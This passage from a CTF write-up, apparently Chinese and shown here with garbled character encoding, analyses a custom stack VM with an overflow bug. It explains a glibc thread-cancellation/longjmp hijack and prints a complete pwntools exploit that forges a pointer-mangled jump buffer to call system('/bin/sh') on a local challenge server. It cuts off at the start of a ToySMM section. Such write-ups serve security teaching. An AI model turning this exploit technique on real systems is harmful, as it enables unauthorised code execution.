class="hljs-string">b&#x27;\x17&#x27;</span><br></code></pre></td></tr></table></figure><p>program.binå¦‚ä¸‹ï¼š</p><table><thead><tr><th>rip</th><th>å­—èŠ‚ç </th><th>å‘½ä»¤</th><th>æ ˆå†…å®¹</th></tr></thead><tbody><tr><td>0</td><td><strong>11</strong> 57 65 6c 63 6f 6d 65 20</td><td>push bâ€™Welcome â€˜</td><td>bâ€™Welcome â€˜</td></tr><tr><td>9</td><td><strong>11</strong> 74 6f 20 54 53 43 54 46</td><td>push bâ€™to TSCTFâ€™</td><td>bâ€™Welcome to TSCTFâ€™</td></tr><tr><td>12</td><td><strong>11</strong> 21 0a 0a 53 74 61 72 74</td><td>push bâ€™!\n\nStartâ€™</td><td>bâ€™Welcome to TSCTF!\n\nStartâ€™</td></tr><tr><td>1b</td><td><strong>11</strong> 20 79 6f 75 72 20 65 78</td><td>push bâ€™ your exâ€™</td><td>bâ€™Welcome to TSCTF!\n\nStart your exâ€™</td></tr><tr><td>24</td><td><strong>11</strong> 70 6c 6f 69 74 20 66 72</td><td>push bâ€™ploit frâ€™</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit frâ€™</td></tr><tr><td>2d</td><td><strong>11</strong> 6f 6d 20 68 65 72 65 21</td><td>push bâ€™om here!â€™</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td>36</td><td><strong>11</strong> 30 00 00 00 00 00 00 00</td><td>push p64(0x30)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30)</td></tr><tr><td>3f</td><td><strong>11</strong> 00 00 00 00 00 00 00 00</td><td>push p64(0)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30)+p64(0)</td></tr><tr><td>48</td><td><strong>0d</strong></td><td>pop p64(0)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td>push p64(stack)</td><td>+p64(0x30)+p64(stack)</td></tr><tr><td>49</td><td><strong>11</strong> fc d2 98 14 10 2c 24 14</td><td>push p64(output)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30)+p64(stack)+p64(output)</td></tr><tr><td>52</td><td><strong>12</strong></td><td>output(stack,0x30)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(cnt)</td></tr><tr><td>53</td><td><strong>11</strong> 30 00 00 00 00 00 00 00</td><td>push p64(0x30)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(cnt)+p64(0x30)</td></tr><tr><td>5c</td><td><strong>03</strong></td><td>pop p64(0x30)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td>pop p64(0x30)</td><td>+p64(0x30-cnt)</td></tr><tr><td></td><td></td><td>push p64(0x30-cnt)</td><td></td></tr><tr><td>5d</td><td><strong>16</strong></td><td>dup</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)+p64(0x30-cnt)</td></tr><tr><td>5e</td><td><strong>11</strong> 9a 00 00 00 00 00 00 00</td><td>push p64(0x9a)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)+p64(0x30-cnt)+p64(0x9a)</td></tr><tr><td>67</td><td><strong>15</strong></td><td>jg</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)</td></tr><tr><td>68</td><td><strong>11</strong> 9a 00 00 00 00 00 00 00</td><td>push p64(0x9a)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)+p64(0x9a)</td></tr><tr><td>71</td><td><strong>14</strong></td><td>jl</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td>72</td><td><strong>11</strong> 9b 00 00 00 00 00 00 00</td><td>push p64(0x9b)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)</td></tr><tr><td>7b</td><td><strong>11</strong> 00 10 00 00 00 00 00 00</td><td>push p64(0x1000)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(0x1000)</td></tr><tr><td>84</td><td><strong>11</strong> 00 00 00 00 00 00 00 00</td><td>push p64(0)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(0x1000)+p64(0)</td></tr><tr><td>8d</td><td><strong>0d</strong></td><td>pop p64(0)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td>push p64(stack)</td><td>+p64(0x9b)+p64(0x1000)+p64(stack)</td></tr><tr><td>8e</td><td><strong>11</strong> 1c 85 c6 e3 59 76 6d f0</td><td>push p64(input)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(0x1000)+p64(stack)</td></tr><tr><td></td><td></td><td></td><td>+p64(input)</td></tr><tr><td>97</td><td><strong>12</strong></td><td>input(stack,0x1000)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(cnt)</td></tr><tr><td>98</td><td><strong>01</strong></td><td>pop</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)</td></tr><tr><td>99</td><td><strong>0c</strong></td><td>ret</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td>9a</td><td><strong>17</strong></td><td>hlt</td><td></td></tr><tr><td>9b</td><td><strong>11</strong> 48 61 76 65 20 66 75 6e</td><td>push bâ€™Have funâ€™</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+bâ€™Have funâ€™</td></tr><tr><td>a4</td><td><strong>11</strong> 08 00 00 00 00 00 00 00</td><td>push p64(8)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+bâ€™Have funâ€™+p64(8)</td></tr><tr><td>ad</td><td><strong>11</strong> 30 00 00 00 00 00 00 00</td><td>push p64(0x30)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+bâ€™Have funâ€™+p64(8)+p64(0x30)</td></tr><tr><td>b6</td><td><strong>0d</strong></td><td>pop p64(0x30)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td>push p64(stack+0x30)</td><td>+bâ€™Have funâ€™+p64(8)+p64(0x30)+p64(stack)</td></tr><tr><td>b7</td><td><strong>11</strong> fc d2 98 14 10 2c 24 14</td><td>push p64(output)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+bâ€™Have funâ€™+p64(8)+p64(0x30)+p64(stack)</td></tr><tr><td></td><td></td><td></td><td>+p64(output)</td></tr><tr><td>c0</td><td><strong>12</strong></td><td>output(stack+0x30,8)</td><td>bâ€™Welcome to TSCTF!\n\nStart your exploit from here!â€™</td></tr><tr><td></td><td></td><td></td><td>+bâ€™Have funâ€™+p64(cnt)</td></tr><tr><td>c1</td><td><strong>17</strong></td><td>hlt</td><td></td></tr></tbody></table><p>æ¼æ´ç‚¹ï¼Œåˆ¤æ–­stack overflowçš„æ—¶å€™ç”¨çš„&#x3D;&#x3D;ï¼Œä½†pushæœ‰1248å››ç§ï¼Œå¯ä»¥æº¢å‡º</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/stackoverflow.png" class title="stackoverflow"><p>ä¸”memory out of rangeè¿˜å–äº†é¡µå¯¹é½ï¼Œæ‰€ä»¥å¯ä»¥æº¢å‡º0xfffå­—èŠ‚</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/outofrange.png" class title="outofrange"><p>æ¯”èµ›çš„æ—¶å€™æ³¨æ„åˆ°è¿™ä¸ªäº†ï¼Œä½†å½“æ—¶è„‘å­æŠ½äº†ä»¥ä¸ºstackåœ¨codeä¸‹é¢ï¼Œè™½ç„¶å°±ç®—æ²¡æé”™æˆ‘æŠŠå¤šçº¿ç¨‹patchæ‰äº†ä¸”ä¸ä¼šæ‰“TLSä¹Ÿæ²¡æˆ.jpg</p><p><em>å…¶å®ä¹Ÿä¸ç®—å¤ªéš¾é€†ï¼Œä¸»è¦æ˜¯å„ç§æ£€æŸ¥å’Œioéƒ½æ˜¯ç”±exceptionå®ç°çš„ï¼Œçœ‹èµ·æ¥å¾ˆä¸‘ï¼Œå—¯ï¼Œéƒ½æ˜¯c++çš„é”…</em></p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><p>å…ˆè´´ä¸€ä¸ªçº¿ç¨‹ç»“æ„ä½“ï¼ˆéƒ¨åˆ†ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pthread</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Unwind information.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pthread_unwind_buf</span> *<span class="hljs-title">cleanup_jmp_buf</span>;</span><br>  <span class="hljs-type">void</span> *result;<br><br>  <span class="hljs-comment">/* Flags determining processing of cancellation.  */</span><br>  <span class="hljs-type">int</span> cancelhandling;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>readå’Œwriteå‡½æ•°ä¸­ä¼šæ ¹æ®__libc_single_threadedå…¨å±€å˜é‡åˆ¤æ–­æ˜¯å¦éœ€è¦è°ƒç”¨__pthread_enable_asynccancelå¼€å¯å¼‚æ­¥å–æ¶ˆ</p><p><em>æºç ä¸å¦‚æ±‡ç¼–ç³»åˆ—ï¼Œççˆ±ç”Ÿå‘½åŸç†å®å®šä¹‰</em></p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/single_thread.png" class title="single_thread"><p>å¤šçº¿ç¨‹æ—¶__libc_single_threaded&#x3D;0å¦åˆ™__libc_single_threaded&#x3D;1</p><h3 id="pthread-enable-asynccancel"><a href="#pthread-enable-asynccancel" class="headerlink" title="__pthread_enable_asynccancel"></a>__pthread_enable_asynccancel</h3><p>__pthread_enable_asynccancelå¤§è‡´æµç¨‹ï¼š</p><ul><li>è·å–å½“å‰çº¿ç¨‹çš„cancelhandlingï¼Œè¿›å…¥å¾ªç¯</li><li>åˆ¤æ–­æ˜¯å¦å·²ç»è®¾ç½®äº†å¼‚æ­¥å–æ¶ˆCANCELTYPE_BITï¼Œæ˜¯åˆ™è·³å‡ºå¾ªç¯ï¼Œå¦åˆ™ç»§ç»­æ‰§è¡Œ</li><li>è®¾ç½®CANCELTYPE_BIT</li><li>åˆ¤æ–­å½“å‰çº¿ç¨‹çš„cancelhandlingæ˜¯å¦è®¾ç½®äº†CANCELED_BITMASKéœ€è¦è¢«å–æ¶ˆï¼Œå¦åˆ™è·³å‡ºå¾ªç¯ï¼Œæ˜¯åˆ™<ul><li>è®¾ç½®å½“å‰çº¿ç¨‹resultä¸ºPTHREAD_CANCELED</li><li>è°ƒç”¨__do_cancelå–æ¶ˆçº¿ç¨‹</li></ul></li></ul><h3 id="do-cancel"><a href="#do-cancel" class="headerlink" title="__do_cancel"></a>__do_cancel</h3><ul><li>è®¾ç½®å½“å‰çº¿ç¨‹cancelhandlingçš„EXITING_BITMASKï¼ˆç¡®ä¿ä¸ä¼šå†è¢«å…¶ä»–çº¿ç¨‹å–æ¶ˆï¼‰</li><li>è°ƒç”¨__pthread_unwindï¼Œå‚æ•°ä¸ºå½“å‰çº¿ç¨‹çš„cleanup_jmp_buf</li></ul><h3 id="pthread-unwind"><a href="#pthread-unwind" class="headerlink" title="__pthread_unwind"></a>__pthread_unwind</h3><p>å½“ä¸€ä¸ªå‡½æ•°æ‹¥æœ‰å¤šä¸ªäº’æ–¥é”å´ä¸å¹¸è¢«cancelæ—¶è¿™ä¸ªå‡½æ•°ç”¨äºå®Œæˆä»–çš„é—å˜±doge</p><ul><li>åˆå§‹åŒ–çº¿ç¨‹çš„excçš„ä¸€äº›field</li><li>è°ƒç”¨_Unwind_ForcedUnwindï¼Œå‚æ•°æ˜¯excï¼Œunwind_stopå‡½æ•°å’Œcleanup_jmp_buf</li></ul><h3 id="Unwind-ForcedUnwind"><a href="#Unwind-ForcedUnwind" class="headerlink" title="_Unwind_ForcedUnwind"></a>_Unwind_ForcedUnwind</h3><ul><li><p>è°ƒç”¨__libc_unwind_link_getè·å–å…¨å±€struct unwind_link globalï¼Œé‡Œé¢çš„å‡½æ•°éƒ½æ˜¯åŠ å¯†è¿‡çš„</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/global.png" class title="global"></li><li><p>è·å–å½“å‰çº¿ç¨‹çš„pointer_guardï¼Œè§£å¯†ptr__Unwind_ForcedUnwind</p></li><li><p>è°ƒç”¨ptr__Unwind_ForcedUnwindæŒ‡å‘çš„å‡½æ•°ï¼Œè¿™ä¸ªæ˜¯libgcc_s.so.1ä¸­çš„_Unwind_ForcedUnwindå‡½æ•°</p></li></ul><h3 id="unwind-stop"><a href="#unwind-stop" class="headerlink" title="unwind_stop"></a>unwind_stop</h3><p>åœ¨libgccä¸­æ‰§è¡Œä¸€äº›å‡½æ•°ååˆä¼šå›åˆ°glibcæ‰§è¡Œunwind_stopï¼Œå‚æ•°stop_parameterä¸ºå½“å‰çº¿ç¨‹çš„cleanup_jmp_buf</p><ul><li>åœ¨start_threadåˆ›å»ºæ–°çº¿ç¨‹çš„æ—¶å€™ä¼šè°ƒç”¨setjmpæ–°å»ºcleanup_jmp_bufï¼Œå¦‚æœè¿™ä¸ªçº¿ç¨‹è¢«å–æ¶ˆï¼Œåˆ™è°ƒç”¨longjmpè¿”å›start_threadè¿›è¡Œæ”¶å°¾å·¥ä½œ</li><li>unwind_stopä¼šåˆ¤æ–­æœ€åä¿å­˜çš„ä¸Šä¸‹æ–‡æ˜¯ä¸æ˜¯æ­£åœ¨å±•å¼€çš„æ ˆå¸§ï¼Œæ˜¯åˆ™è°ƒç”¨longjmpï¼Œ<strong>éœ€è¦åˆ©ç”¨è¿™ä¸€è¿‡ç¨‹</strong></li></ul><h3 id="longjmp"><a href="#longjmp" class="headerlink" title="longjmp"></a>longjmp</h3><p>è°ƒç”¨æµç¨‹å¦‚ä¸‹ï¼Œè¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆå½“ç„¶ä¹Ÿæ˜¯åŠ å¯†è¿‡çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_longjmp -&gt; __longjmp_cancel -&gt; *(cleanup_jmp_buf+<span class="hljs-number">0x38</span>)(cleanup_jmp_buf)<br>       rsp=*(cleanup_jmp_buf+<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p><em>åŠ å¯†æ˜¯å¾ªç¯<strong>å·¦ç§»0x11</strong>ä¸æ˜¯å³ç§»11^v^</em></p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p>ç”¨å¾ªç¯ï¼Œåªç”¨dupå‘çš„æ•°æ®å¤ªå¤šreadå¯èƒ½æå‰ç»“æŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmnop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmadd</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmsub</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmul</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmdiv</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmod</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmand</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmxor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmnot</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmcall</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(addr))+<span class="hljs-string">b&#x27;\x0b&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmret</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(addr))+<span class="hljs-string">b&#x27;\x0c&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmlea</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(offset))+<span class="hljs-string">b&#x27;\x0d&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush1</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0e&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush2</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0f&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush4</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush8</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x11&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmoutput</span>(<span class="hljs-params">offset,cnt</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(cnt))+vmlea(offset)+vmpush8(p64(<span class="hljs-number">0x14242c101498d2fc</span>))+<span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vminput</span>(<span class="hljs-params">offset,cnt</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(cnt))+vmlea(offset)+vmpush8(p64(<span class="hljs-number">0xf06d7659e3c6851c</span>))+<span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmodcall</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjne</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x13&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjl</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x14&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjg</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x15&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmdup</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x16&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmhlt</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x17&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>shellcode=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>*<span class="hljs-number">3</span>)+p64(<span class="hljs-number">0x100</span>)+p64(<span class="hljs-number">0x14e</span>)+p64(<span class="hljs-number">0xfffffffffffe0000</span>)+p64(<span class="hljs-number">0x8d</span>)<br>pause()<br>p.sendafter(<span class="hljs-string">b&#x27;Start your exploit from here!&#x27;</span>,shellcode)<br>pause()<br><br>shellcode=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x98</span>+<span class="hljs-string">b&#x27;\x01\x0c&#x27;</span><br>shellcode=shellcode.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>shellcode+=vmlea(<span class="hljs-number">0</span>)+vmoutput(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>)+vminput(<span class="hljs-number">0xfffffffffffe0200</span>,<span class="hljs-number">0x20000</span>-<span class="hljs-number">0x200</span>)+vmret(<span class="hljs-number">0x200</span>)<br><span class="hljs-comment"># overflow</span><br>p.send(shellcode)<br>vmstack=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x820000</span><br>stack=vmstack+<span class="hljs-number">0x20000</span>+<span class="hljs-number">8</span><br>system_addr=vmstack+<span class="hljs-number">0x930000</span>+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vmstack))<br><br>shellcode=vmpush8(p64(<span class="hljs-number">0</span>))+vmdup()+vmpush8(p64(<span class="hljs-number">1</span>))+vmadd()+vmdup()<br>shellcode+=vmpush8(p64((<span class="hljs-number">0x20000</span>-<span class="hljs-number">0x30</span>)//<span class="hljs-number">8</span>-<span class="hljs-number">4</span>))+vmsub()<br>shellcode+=vmpush8(p64(<span class="hljs-number">0x209</span>))+vmjg()<br>shellcode+=vmpush8(<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()<br>shellcode+=vmpush4(<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">4</span>)+vmdup()+vmpush4(<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">4</span>)<br>shellcode+=vmpush8(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()*<span class="hljs-number">0xe6</span><br>shellcode+=vmpush8(p64(vmstack+<span class="hljs-number">0x840740</span>))+vmpush8(p64(vmstack+<span class="hljs-number">0x8410e0</span>))+vmpush8(p64(vmstack+<span class="hljs-number">0x840740</span>))<br>shellcode+=vmpush8(p64(<span class="hljs-number">1</span>))+vmpush8(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()*(<span class="hljs-number">736</span>//<span class="hljs-number">8</span>-<span class="hljs-number">1</span>)<br>shellcode+=vmpush8(p64(vmstack+<span class="hljs-number">0x800400</span>))+vmpush4(p32(<span class="hljs-number">8</span>))+vmoutput(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>)<br>shellcode=shellcode.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>shellcode+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span>+p64((stack&lt;&lt;<span class="hljs-number">0x11</span>)|((stack&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>))<br>shellcode+=p64((system_addr&lt;&lt;<span class="hljs-number">0x11</span>)|((system_addr&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>))<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ToySMM"><a href="#ToySMM" class="headerlink" title="ToySMM"></a>ToySMM</h1><p>\å‘†ç¥&#x2F; \å‘†ç¥&#x2F; \å‘†ç¥&#x2F;</p><h2 id="å…ˆåº·åº·é™„ä»¶"><a href="#å…ˆåº·åº·é™„ä»¶" class="headerlink" title="å…ˆåº·åº·é™„ä»¶"></a>å…ˆåº·åº·é™„ä»¶</h2><p>å°è¯•æ”¹å˜ä¸€ä¸‹æ€ç»´æ–¹å¼ï¼Œä¸èƒ½ä»€ä¹ˆéƒ½è¿½æº¯åˆ°å®‡å®™æ´ªè’ï¼Œæ•ˆç‡ä½å­¦ä¹ æˆæœ¬é«˜å®¹æ˜“åŠé€€ï¼Œè¯´ä¸å®šèµ°ä¸€æ­¥çœ‹ä¸€æ­¥ä¼šæœ‰å¥‡æ•ˆï¼šï¼‰</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 